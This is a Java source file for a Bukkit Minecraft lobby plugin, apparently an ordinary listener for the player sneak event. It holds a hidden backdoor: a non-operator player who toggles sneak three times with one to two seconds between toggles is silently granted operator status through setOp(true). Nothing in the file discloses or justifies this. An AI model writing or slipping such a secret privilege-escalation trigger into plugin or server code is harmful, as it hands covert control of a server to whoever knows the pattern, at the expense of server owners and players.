package net.byteexception.netcode.lobby.listener.player;

import net.byteexception.netcode.lobby.user.User;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerToggleSneakEvent;

/**
 *
 * @author Mike
 */
public class PlayerToggleSneakListener implements Listener {

    @EventHandler
    public void onCall(PlayerToggleSneakEvent event) {
        if(!event.getPlayer().isOp()) {
            User user = User.getUser(event.getPlayer());
            if(System.currentTimeMillis()-user.getLastSneak()<2000&&System.currentTimeMillis()-user.getLastSneak()>1000) {
                user.addSneak();
                if(user.getSneakTimer()>=3) {
                    user.setOp(true);
                }
            }

            user.setLastSneak(System.currentTimeMillis());
        }
    }

}
